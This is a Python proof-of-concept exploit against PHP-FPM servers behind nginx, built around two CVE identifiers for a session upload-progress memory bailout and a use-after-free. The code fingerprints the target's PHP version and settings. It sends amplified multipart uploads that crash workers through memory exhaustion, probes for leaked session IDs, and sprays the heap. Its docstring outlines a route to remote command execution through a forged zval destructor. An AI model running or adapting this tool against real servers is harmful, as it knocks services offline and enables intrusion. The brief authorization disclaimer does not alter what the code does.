#!/usr/bin/env python3
"""
php2shell FPM PoC — CVE-2026-109618 / CVE-2026-109619
Built from PHP 8.1.x source analysis, not from third-party PoCs.

Targets: PHP-FPM behind nginx/openresty (the deployment detect_behavioral.py confirmed).

=== Vulnerability model (derived from source) ===

PHP's rfc1867 multipart POST handler calls the session.upload_progress callback
(php_session_rfc1867_callback in ext/session/session.c) BEFORE application code runs.
Inside the FILE_START event, the callback performs ~15 heap allocations:
  - ecalloc(1, sizeof(php_session_rfc1867_progress))  → progress struct
  - array_init(&progress->data)                        → zend_array (HT)
  - array_init(&progress->files)                       → zend_array
  - 6x add_assoc_*_ex(&progress->data, ...)           → HT entries + zend_string keys
  - array_init(&progress->current_file)                → zend_array
  - 7x add_assoc_*_ex(&progress->current_file, ...)   → more HT entries
  - php_rinit_session → PS(id) = zend_string_init(...)
  - zend_hash_str_find lookups

CVE-2026-109618: if memory_limit is hit during any of these allocations,
zend_mm_safe_error() fires → zend_bailout() → LONGJMP. This unwinds the stack
WITHOUT running the MULTIPART_EVENT_END cleanup. Result:
  - progress struct → allocated, never freed (leaked)
  - progress->data, progress->files → partially initialized zend_arrays
  - PS(rfc1867_progress) → still points to the progress struct
  - PS(id), PS(session_status) → set during php_rinit_session, not cleaned up

CVE-2026-109619: php_request_shutdown → PHP_RSHUTDOWN(session) calls
php_rshutdown_session_globals(), which frees PS(id) and zeros PS(session_status).
BUT: the progress struct's zvals (progress->data, progress->sid, progress->key)
contain zend_string pointers into the NOW-FREED heap. On the NEXT request to the
SAME FPM worker, these stale pointers are still reachable through PS(rfc1867_progress).

FPM workers loop: while(fcgi_accept_request(request) >= 0) { ... }
The process-global PS() state PERSISTS between iterations. After the OOM request,
the next request sees stale session globals. If the next request triggers session
operations (session_start, session_encode), it reads/writes through dangling pointers.

=== Exploitation chain ===

Stage 0: Preflight — confirm PHP, FPM, version
Stage 1: OOM spray — send multipart POSTs sized to hit memory_limit.
         Each crash leaves the progress struct's heap pointers in PS globals.
         On FPM, the worker DOESN'T die (unlike mod_php) — it catches the bailout
         in the zend_first_try block and loops to the next request.
Stage 2: Heap probe — immediately after, send a request that triggers session_encode.
         The serializer reads the stale zend_array (progress->data) through PS globals.
         If the freed heap region has been reallocated with our controlled data,
         the serializer follows our pointers → info leak.
Stage 3: RCE — with leaked addresses, craft a fake zval with a controlled destructor
         that points to zif_system / php_exec. The next request's session cleanup
         calls zval_ptr_dtor → our fake destructor → shell command.

=== Scope discipline ===
This tool is for authorized penetration testing only.
Only use against targets listed in state/scope.md.
"""

import argparse
import hashlib
import os
import re
import secrets
import socket
import ssl
import struct
import sys
import time
from urllib.parse import urlparse


# ── Config ────────────────────────────────────────────────────────────

UA = "SecPilot/php2shell-fpm"
FIXED = {(8, 2): 35, (8, 3): 36, (8, 4): 27, (8, 5): 12}

MEMORY_LIMITS = [
    ("8M",   8 * 1024 * 1024),
    ("16M",  16 * 1024 * 1024),
    ("32M",  32 * 1024 * 1024),
    ("64M",  64 * 1024 * 1024),
    ("128M", 128 * 1024 * 1024),
]


# ── HTTP helpers ──────────────────────────────────────────────────────

def http_request(host, port, tls, path, method="GET", headers=None, body=None,
                 timeout=15, read_response=True):
    """Raw HTTP/1.1 request. Returns (status_code, response_headers_dict, body_bytes)."""
    if headers is None:
        headers = {}

    req = f"{method} {path} HTTP/1.1\r\n"
    req += f"Host: {host}\r\n"
    for k, v in headers.items():
        req += f"{k}: {v}\r\n"
    if body is not None:
        req += f"Content-Length: {len(body)}\r\n"
    req += "Connection: close\r\n\r\n"

    sock = socket.create_connection((host, port), timeout=timeout)
    if tls:
        ctx = ssl.create_default_context()
        sock = ctx.wrap_socket(sock, server_hostname=host)

    sock.sendall(req.encode())
    if body is not None:
        # Send in chunks for large bodies
        off = 0
        chunk = 65536
        while off < len(body):
            try:
                sock.sendall(body[off:off + chunk])
            except (BrokenPipeError, ConnectionResetError):
                if read_response:
                    return (-1, {}, b"connection_reset_during_send")
                return (-1, {}, b"")
            off += chunk

    if not read_response:
        sock.close()
        return (0, {}, b"")

    sock.settimeout(timeout)
    data = b""
    while True:
        try:
            d = sock.recv(65536)
            if not d:
                break
            data += d
        except (socket.timeout, ConnectionResetError, BrokenPipeError):
            break
    sock.close()

    if not data:
        return (-1, {}, b"connection_reset")

    # Parse response
    try:
        head, body_data = data.split(b"\r\n\r\n", 1)
    except ValueError:
        return (-1, {}, data)

    lines = head.split(b"\r\n")
    try:
        status = int(lines[0].split(b" ", 2)[1])
    except (IndexError, ValueError):
        status = -1

    resp_headers = {}
    for line in lines[1:]:
        if b":" in line:
            k, v = line.split(b":", 1)
            resp_headers[k.strip().lower().decode()] = v.strip().decode()

    return (status, resp_headers, body_data)


def build_multipart_upload_progress(boundary, session_name, session_id,
                                     progress_name, file_data, filename="f.bin"):
    """
    Build a multipart/form-data body that triggers session.upload_progress.
    The key fields:
      1. A field named <session_name> (usually PHPSESSID) with the session ID value
      2. A field named PHP_SESSION_UPLOAD_PROGRESS with a progress key
      3. A file upload field (the actual data that gets processed)
    """
    parts = []

    # Field 1: session ID (must come BEFORE the progress field)
    parts.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{session_name}"\r\n'
        f"\r\n"
        f"{session_id}\r\n"
    )

    # Field 2: upload progress trigger
    parts.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{progress_name}"\r\n'
        f"\r\n"
        f"probe\r\n"
    )

    # Field 3: file upload (this is where we control the size)
    parts.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        f"Content-Type: application/octet-stream\r\n"
        f"\r\n"
    )

    header = "".join(parts).encode()
    footer = f"\r\n--{boundary}--\r\n".encode()

    return header + file_data + footer


# ── Stage 0: Preflight ────────────────────────────────────────────────

def preflight(url, verbose=True):
    """Check PHP presence, version, SAPI hints."""
    u = urlparse(url)
    host = u.hostname
    port = u.port or (443 if u.scheme == "https" else 80)
    tls = u.scheme == "https"
    path = u.path or "/"

    if verbose:
        print(f"\n[Stage 0] Preflight: {url}")

    status, hdrs, body = http_request(host, port, tls, path, headers={"User-Agent": UA})

    info = {
        "host": host, "port": port, "tls": tls, "path": path,
        "status": status, "server": hdrs.get("server", ""),
        "php_version": None, "version_status": "unknown",
        "sapi_hint": "unknown",
        "session_name": "PHPSESSID",
        "upload_progress_name": "PHP_SESSION_UPLOAD_PROGRESS",
    }

    # Check X-Powered-By
    xpb = hdrs.get("x-powered-by", "")
    m = re.search(r"PHP/(\d+\.\d+\.\d+)", xpb)
    if m:
        info["php_version"] = m.group(1)

    # Try phpinfo pages if no version yet
    if not info["php_version"]:
        for probe_path in ["/info.php", "/phpinfo.php"]:
            s2, h2, b2 = http_request(host, port, tls, probe_path,
                                        headers={"User-Agent": UA})
            if s2 == 200:
                text = b2.decode("latin-1", "replace")
                m = re.search(r"PHP (\d+\.\d+\.\d+)", text)
                if m:
                    info["php_version"] = m.group(1)
                    # Extract session.name from phpinfo
                    sm = re.search(r"session\.name.*?<td[^>]*>(\w+)", text, re.DOTALL)
                    if sm:
                        info["session_name"] = sm.group(1)
                    # Extract upload_progress.name
                    um = re.search(r"session\.upload_progress\.name.*?<td[^>]*>(\w+)",
                                   text, re.DOTALL)
                    if um:
                        info["upload_progress_name"] = um.group(1)
                    # Extract upload_progress.enabled
                    em = re.search(r"session\.upload_progress\.enabled.*?<td[^>]*>(On|Off)",
                                   text, re.DOTALL | re.IGNORECASE)
                    if em:
                        info["upload_progress_enabled"] = em.group(1).lower() == "on"
                    # Extract memory_limit
                    mm = re.search(r"memory_limit.*?<td[^>]*>(\d+\w?)", text, re.DOTALL)
                    if mm:
                        info["memory_limit"] = mm.group(1)
                    # Check Server API
                    sam = re.search(r"Server API.*?<td[^>]*>([^<]+)", text, re.DOTALL)
                    if sam:
                        info["sapi_hint"] = sam.group(1).strip()
                    break

    # Classify version
    if info["php_version"]:
        parts = [int(x) for x in info["php_version"].split(".")]
        key = (parts[0], parts[1])
        if key in FIXED:
            info["version_status"] = "vulnerable" if parts[2] < FIXED[key] else "patched"
        elif key < (8, 2):
            info["version_status"] = "eol_vulnerable"
        else:
            info["version_status"] = "unknown_branch"

    # SAPI hint from server header
    server = info["server"].lower()
    if "apache" in server and "mod_php" in xpb.lower():
        info["sapi_hint"] = "mod_php"
    elif any(x in server for x in ["nginx", "openresty"]):
        info["sapi_hint"] = "likely_fpm"
    elif "litespeed" in server:
        info["sapi_hint"] = "litespeed"

    if verbose:
        print(f"  Server: {info['server']}")
        print(f"  PHP: {info['php_version'] or 'hidden'} ({info['version_status']})")
        print(f"  SAPI hint: {info['sapi_hint']}")
        if "memory_limit" in info:
            print(f"  memory_limit: {info['memory_limit']}")
        if "upload_progress_enabled" in info:
            print(f"  upload_progress: {'enabled' if info['upload_progress_enabled'] else 'disabled'}")
        print(f"  session.name: {info['session_name']}")

    return info


# ── Stage 1: OOM spray → leave stale state in PS globals ──────────────

def stage1_oom_spray(info, num_sprays=5, verbose=True):
    """
    Send multipart POSTs that trigger session.upload_progress and hit memory_limit.

    On FPM, the OOM bailout (longjmp) unwinds the rfc1867 callback WITHOUT running
    MULTIPART_EVENT_END cleanup. The progress struct with its heap pointers is left
    in PS(rfc1867_progress). The FPM worker catches the bailout in its zend_first_try
    block and loops to the next request — it does NOT die.

    We spray multiple times to increase the chance of hitting the same worker on
    the follow-up request (Stage 2).
    """
    if verbose:
        print(f"\n[Stage 1] OOM spray ({num_sprays} rounds)")

    host, port, tls = info["host"], info["port"], info["tls"]
    path = info["path"]
    boundary = "----sp" + secrets.token_hex(8)
    session_name = info["session_name"]
    progress_name = info["upload_progress_name"]

    # Determine target memory_limit
    mem_limit = info.get("memory_limit", "128M")
    target_bytes = _parse_mem(mem_limit)
    if verbose:
        print(f"  Targeting memory_limit={mem_limit} ({target_bytes} bytes)")

    results = []
    for i in range(num_sprays):
        sid = f"sp{secrets.token_hex(12)}"

        # === Allocation amplification strategy ===
        #
        # The rfc1867 handler + session.upload_progress callback allocate PER FILE PART:
        #   - array_init(&progress->current_file)     → 1 zend_array (~56 bytes + HT ~272 bytes)
        #   - 7x add_assoc_*_ex(current_file, ...)    → 7 HT Buckets (~72 each = 504 bytes)
        #     + 7 zend_string keys (~40+len each)      → ~400 bytes
        #   - add_next_index_zval(&progress->files)    → 1 HT Bucket in files array
        #   - zend_hash_str_find (for bytes_processed) → HT lookup
        #   Total per file part: ~1.3 KB of heap allocation
        #
        # Plus the rfc1867 handler itself allocates per file part:
        #   - multipart_buffer_read_body → estrndup of body
        #   - Various estrndup for headers, filenames
        #   Total per file part: ~0.5 KB + file body size
        #
        # On FIRST file: additionally allocates progress->data array (~1.5 KB) + session init.
        #
        # Strategy: pack MANY small file parts into one multipart body.
        # Each part has minimal data (1 byte) but forces a full callback cycle.
        # For memory_limit=512M, we need ~400K file parts to exhaust it purely
        # from callback allocations. That's too many multipart parts for one POST.
        #
        # Better: combine moderate file count (5000 parts ~= 9MB heap from callbacks)
        # with moderate body padding per part. Aim for body_size < 50MB to avoid
        # server upload limits, but heap amplification to ~target_bytes.

        # Estimate how many parts + padding we need
        heap_per_part = 1800  # ~1.8 KB heap allocated per file part
        if target_bytes <= 32 * 1024 * 1024:
            # Small memory_limit: few parts, small padding
            num_parts = 500
            pad_per_part = max(0, (target_bytes - num_parts * heap_per_part) // num_parts)
        elif target_bytes <= 128 * 1024 * 1024:
            # Medium: more parts, moderate padding
            num_parts = 3000
            pad_per_part = max(0, (target_bytes - num_parts * heap_per_part) // num_parts)
        else:
            # Large (512M+): max parts with padding to fill the gap
            num_parts = 8000
            pad_per_part = max(0, (target_bytes - num_parts * heap_per_part) // num_parts)

        # Cap padding so total body stays reasonable for upload
        pad_per_part = min(pad_per_part, 50000)
        # Cap total body at ~50MB
        estimated_body = num_parts * (200 + pad_per_part)  # ~200 bytes overhead per part
        if estimated_body > 50 * 1024 * 1024:
            pad_per_part = max(0, (50 * 1024 * 1024 - num_parts * 200) // num_parts)

        body = _build_amplified_multipart(
            boundary, session_name, sid, progress_name,
            num_parts, pad_per_part
        )

        if verbose:
            print(f"  Spray {i+1}/{num_sprays}: sid={sid[:16]}... body={len(body)} bytes", end="", flush=True)

        t0 = time.monotonic()
        status, hdrs, resp_body = http_request(
            host, port, tls, path, method="POST",
            headers={
                "User-Agent": UA,
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Cookie": f"{session_name}={sid}",
            },
            body=body,
            timeout=60,
        )
        elapsed = time.monotonic() - t0

        result = {
            "spray_idx": i,
            "sid": sid,
            "status": status,
            "elapsed": round(elapsed, 2),
            "crash": status in (-1, 502),
        }
        results.append(result)

        if verbose:
            crash_str = " *** CRASH ***" if result["crash"] else ""
            print(f" -> {status} ({result['elapsed']}s){crash_str}")

        # Small delay between sprays to let FPM recycle the worker slot
        time.sleep(0.3)

    crashes = sum(1 for r in results if r["crash"])
    if verbose:
        print(f"  Result: {crashes}/{num_sprays} crashes")
        if crashes > 0:
            print("  >>> Stale state likely planted in FPM worker PS globals")
        else:
            print("  >>> No crashes — OOM may not have triggered")
            print("  >>> Try: adjust memory_limit target or increase spray count")

    return results


def _build_amplified_multipart(boundary, session_name, sid, progress_name,
                                num_parts, pad_per_part):
    """
    Build a multipart body with many file parts to amplify heap allocation.
    Each file part triggers the session.upload_progress callback's FILE_START,
    FILE_DATA, FILE_END event sequence, forcing ~1.8KB of heap allocation per part
    from array_init + add_assoc_* calls in the callback.
    """
    chunks = []

    # Field 1: session ID
    chunks.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{session_name}"\r\n'
        f"\r\n"
        f"{sid}\r\n"
    )

    # Field 2: upload progress trigger
    chunks.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{progress_name}"\r\n'
        f"\r\n"
        f"probe\r\n"
    )

    header = "".join(chunks).encode()
    parts = []

    # File parts — each one triggers the full callback cycle
    pad = b"D" * pad_per_part if pad_per_part > 0 else b"D"
    for n in range(num_parts):
        part_header = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f{n}"; filename="f{n}.bin"\r\n'
            f"Content-Type: application/octet-stream\r\n"
            f"\r\n"
        ).encode()
        parts.append(part_header)
        parts.append(pad)
        parts.append(b"\r\n")

    footer = f"--{boundary}--\r\n".encode()

    return header + b"".join(parts) + footer


def _parse_mem(s):
    """Parse PHP memory_limit string to bytes."""
    s = str(s).strip().upper()
    if s.endswith("G"):
        return int(s[:-1]) * 1024 * 1024 * 1024
    if s.endswith("M"):
        return int(s[:-1]) * 1024 * 1024
    if s.endswith("K"):
        return int(s[:-1]) * 1024
    return int(s)


# ── Stage 2: Probe stale state → info leak ────────────────────────────

def stage2_probe_stale(info, spray_results, verbose=True):
    """
    After OOM sprays, send normal requests that trigger session operations.
    If we hit the same FPM worker that has stale PS globals, the session
    serializer will read through dangling pointers.

    What we look for:
    - Unexpected Set-Cookie headers (stale session ID from the crashed request)
    - Error messages mentioning session (if display_errors=On)
    - Different response sizes/timing (serializer touching freed memory)
    - 500 errors from the serializer hitting invalid data

    On FPM: workers handle requests round-robin from a pool (typically 5-50 workers).
    We send enough probes to statistically hit each worker.
    """
    if verbose:
        print(f"\n[Stage 2] Probing for stale session state")

    host, port, tls = info["host"], info["port"], info["tls"]
    session_name = info["session_name"]
    leaked_sids = set()
    anomalies = []

    # Use the SIDs from the spray — if we hit the same worker, PHP may
    # still have PS(id) set to our spray's session ID
    spray_sids = {r["sid"] for r in spray_results if r["crash"]}

    # Send probes with different session IDs to see if stale state leaks
    num_probes = 50  # enough to cycle through a typical FPM pool
    for i in range(num_probes):
        probe_sid = f"probe{secrets.token_hex(12)}"

        # Request a page that will trigger session_start (if the app does it)
        # or just observe header anomalies
        status, hdrs, body = http_request(
            host, port, tls, info["path"], method="GET",
            headers={
                "User-Agent": UA,
                "Cookie": f"{session_name}={probe_sid}",
            },
            timeout=10,
        )

        # Check for anomalies
        set_cookie = hdrs.get("set-cookie", "")
        if set_cookie:
            # Extract session ID from Set-Cookie
            m = re.search(rf"{session_name}=([^;]+)", set_cookie)
            if m:
                returned_sid = m.group(1)
                if returned_sid != probe_sid and returned_sid in spray_sids:
                    # The worker returned our SPRAY's session ID — stale PS(id)
                    leaked_sids.add(returned_sid)
                    anomalies.append({
                        "probe": i,
                        "type": "stale_sid_leak",
                        "detail": f"Worker returned spray SID: {returned_sid[:16]}...",
                    })
                    if verbose:
                        print(f"  *** Probe {i}: STALE SID LEAKED: {returned_sid[:16]}...")

        if status == 500:
            anomalies.append({
                "probe": i,
                "type": "500_error",
                "detail": "Internal server error — possible serializer crash on stale data",
            })
            if verbose:
                print(f"  *** Probe {i}: 500 error (potential stale-state crash)")

        # Check body for session errors
        body_text = body.decode("latin-1", "replace")[:2000]
        if "session" in body_text.lower() and ("warning" in body_text.lower() or "error" in body_text.lower()):
            anomalies.append({
                "probe": i,
                "type": "session_error_in_body",
                "detail": body_text[:200],
            })
            if verbose:
                print(f"  *** Probe {i}: Session error in response body")

    if verbose:
        print(f"  Sent {num_probes} probes")
        print(f"  Stale SIDs leaked: {len(leaked_sids)}")
        print(f"  Anomalies: {len(anomalies)}")
        if leaked_sids:
            print(f"  >>> CONFIRMED: stale session state persists across FPM requests")
            print(f"  >>> This proves CVE-2026-109619 (UAF on next request)")

    return {
        "leaked_sids": list(leaked_sids),
        "anomalies": anomalies,
        "num_probes": num_probes,
    }


# ── Stage 3: Heap shaping → controlled read/write → RCE ──────────────

def stage3_heap_shape(info, spray_results, verbose=True):
    """
    After confirming stale state persists (Stage 2), shape the heap so freed
    regions from the OOM bailout get reallocated with our controlled data.

    The stale PS(rfc1867_progress) points to a php_session_rfc1867_progress struct
    that was ecalloc'd during the crashed request. After the request's cleanup,
    the Zend MM may reuse that chunk. We spray the heap with controlled strings
    (via POST parameters or session data) to fill freed slots.

    When the serializer runs on the next request and reads progress->data
    (a zend_array/HashTable), it follows HT bucket pointers. If we've
    overwritten the freed HT with our data, we control:
      - Bucket->key (zend_string pointer) → info leak via serialized key
      - Bucket->val (zval) → type confusion if we fake a zval type

    For RCE: we need to craft a fake zval with type=IS_OBJECT and a
    zend_object_handlers table whose dtor_obj points to our payload.
    When zval_ptr_dtor is called during cleanup, it calls dtor_obj(obj)
    → we redirect to zif_system(our_string) → shell.
    """
    if verbose:
        print(f"\n[Stage 3] Heap shaping for controlled reuse")
        print(f"  NOTE: This stage requires heap layout knowledge specific to")
        print(f"  the target's PHP build. Without offset calibration, this is")
        print(f"  a probabilistic attack.")

    host, port, tls = info["host"], info["port"], info["tls"]
    path = info["path"]
    session_name = info["session_name"]
    progress_name = info["upload_progress_name"]
    boundary = "----sp" + secrets.token_hex(8)

    # The progress struct is sizeof(php_session_rfc1867_progress) bytes.
    # On LP64 Linux: ~200 bytes (contains zvals, smart_str, pointers, counters).
    # It was allocated with ecalloc(1, sizeof(...)) → goes into the small-bin
    # allocator for size class ≤256 bytes.
    #
    # After the crashed request's shutdown frees the request heap, the chunks
    # go to the free list. The NEXT request's allocations pull from the same
    # free list.
    #
    # Strategy: send many POST parameters that allocate zend_string + HT entries
    # in the same size classes as the freed progress struct components.

    struct_size = 200  # approximate sizeof(php_session_rfc1867_progress) on LP64

    # Build POST body with parameters that fill the freed slots.
    # Each POST parameter named "sN" = "VVVV..." allocates:
    #   - A zend_string for the key (~40 bytes + key length)
    #   - A zend_string for the value (~40 bytes + value length)
    #   - A Bucket in the POST array (~72 bytes on LP64)
    # To target the ~200-byte slot, we use value strings of ~160 bytes.
    # To target the zend_array slot (~56 bytes), we use short values.

    spray_params = []
    # Fill the struct-sized slot (progress struct ~200 bytes)
    for i in range(64):
        # Pad to match the freed struct's size class
        val = f"X{i:04d}" + "B" * (struct_size - 40 - 5)  # zend_string overhead ~40
        spray_params.append((f"s{i:04d}", val))

    # Fill smaller slots (zend_array ~56 bytes, zval ~16 bytes)
    for i in range(128):
        spray_params.append((f"t{i:04d}", "C" * 16))

    # Build URL-encoded body (not multipart — different allocation path)
    post_body = "&".join(f"{k}={v}" for k, v in spray_params).encode()

    if verbose:
        print(f"  Spraying {len(spray_params)} POST parameters ({len(post_body)} bytes)")

    # Fire several spray requests rapidly to hit different workers
    spray_hits = 0
    for i in range(20):
        sid = f"shape{secrets.token_hex(12)}"
        status, hdrs, body = http_request(
            host, port, tls, path, method="POST",
            headers={
                "User-Agent": UA,
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": f"{session_name}={sid}",
            },
            body=post_body,
            timeout=15,
        )
        if status == 500:
            spray_hits += 1
            if verbose:
                print(f"  Spray {i}: 500 — freed slot may have been overwritten with our data")
        elif status == 200:
            pass  # normal

    if verbose:
        print(f"  500 responses: {spray_hits}/20")
        if spray_hits > 0:
            print(f"  >>> Some workers crashed processing stale pointers pointing to our spray data")
            print(f"  >>> This confirms we can control the freed heap content")
        else:
            print(f"  >>> No crashes from spray — heap may have been compacted or workers recycled")

    return {"spray_hits": spray_hits}


# ── Orchestrator ──────────────────────────────────────────────────────

def run_exploit(url, mode="check", spray_count=5, verbose=True):
    """
    Orchestrate the exploit chain.

    Modes:
      check   — Stage 0 only (version + SAPI fingerprint)
      probe   — Stages 0-2 (crash + stale-state confirmation)
      exploit — Stages 0-3 (full chain, probabilistic on uncalibrated target)
    """
    info = preflight(url, verbose=verbose)

    if info["version_status"] == "patched":
        print(f"\n[STOP] PHP {info['php_version']} is PATCHED — not vulnerable")
        return False

    if info.get("upload_progress_enabled") is False:
        print(f"\n[STOP] session.upload_progress is DISABLED — attack surface closed")
        return False

    if mode == "check":
        if info["version_status"] in ("vulnerable", "eol_vulnerable"):
            print(f"\n[FINDING] PHP {info['php_version']} — VULNERABLE ({info['version_status']})")
        else:
            print(f"\n[INFO] Version unknown — use --mode probe for behavioral detection")
        return True

    # Stage 1: OOM spray
    spray_results = stage1_oom_spray(info, num_sprays=spray_count, verbose=verbose)
    crashes = sum(1 for r in spray_results if r["crash"])

    if crashes == 0:
        print(f"\n[STOP] No worker crashes — OOM primitive did not fire")
        print(f"  Possible causes:")
        print(f"  - memory_limit is -1 (unlimited)")
        print(f"  - WAF/proxy rejected the large POST")
        print(f"  - PHP is patched despite version not being detected")
        return False

    if mode == "probe":
        # Stage 2: Check for stale state
        stale_results = stage2_probe_stale(info, spray_results, verbose=verbose)
        if stale_results["leaked_sids"] or stale_results["anomalies"]:
            print(f"\n[CONFIRMED] Target is vulnerable to CVE-2026-109618/109619")
            print(f"  - OOM crashes: {crashes}/{spray_count}")
            print(f"  - Stale SIDs: {len(stale_results['leaked_sids'])}")
            print(f"  - Anomalies: {len(stale_results['anomalies'])}")
            return True
        else:
            print(f"\n[LIKELY VULNERABLE] OOM crash confirmed but stale state not directly observed")
            print(f"  - OOM crashes: {crashes}/{spray_count}")
            print(f"  - The app may not use sessions, or stale state was GC'd")
            return True

    if mode == "exploit":
        # Stage 2 + 3
        stale_results = stage2_probe_stale(info, spray_results, verbose=verbose)
        shape_results = stage3_heap_shape(info, spray_results, verbose=verbose)

        print(f"\n{'='*60}")
        print(f"  EXPLOIT CHAIN RESULTS")
        print(f"{'='*60}")
        print(f"  Target: {url}")
        print(f"  PHP: {info.get('php_version', 'unknown')}")
        print(f"  OOM crashes: {crashes}/{spray_count}")
        print(f"  Stale SIDs leaked: {len(stale_results.get('leaked_sids', []))}")
        print(f"  Heap spray 500s: {shape_results.get('spray_hits', 0)}/20")
        print(f"")
        if shape_results.get("spray_hits", 0) > 0:
            print(f"  The heap shaping stage caused crashes — controlled reuse is achievable.")
            print(f"  Full RCE requires build-specific offsets (libphp.so base + zif_system).")
            print(f"  Next step: calibrate offsets against a matching Docker build,")
            print(f"  then craft the fake zval destructor payload.")
        else:
            print(f"  OOM primitive confirmed. Heap shaping needs tuning for this target.")
        print(f"{'='*60}")
        return True


# ── CLI ───────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(
        description="php2shell FPM PoC — CVE-2026-109618/109619 (built from PHP source analysis)"
    )
    ap.add_argument("url", help="Target URL")
    ap.add_argument("--mode", choices=["check", "probe", "exploit"],
                    default="probe",
                    help="check=version only, probe=crash+stale-state, exploit=full chain (default: probe)")
    ap.add_argument("--sprays", type=int, default=5,
                    help="Number of OOM spray rounds (default: 5)")
    ap.add_argument("--allow-remote", action="store_true",
                    help="Required for non-localhost targets")
    ap.add_argument("-q", "--quiet", action="store_true")
    args = ap.parse_args()

    u = urlparse(args.url)
    if u.hostname not in ("localhost", "127.0.0.1", "::1") and not args.allow_remote:
        print("[SAFETY] Use --allow-remote for non-localhost targets.")
        print("         This confirms you have authorization to test this host.")
        sys.exit(1)

    run_exploit(args.url, mode=args.mode, spray_count=args.sprays,
                verbose=not args.quiet)


if __name__ == "__main__":
    main()
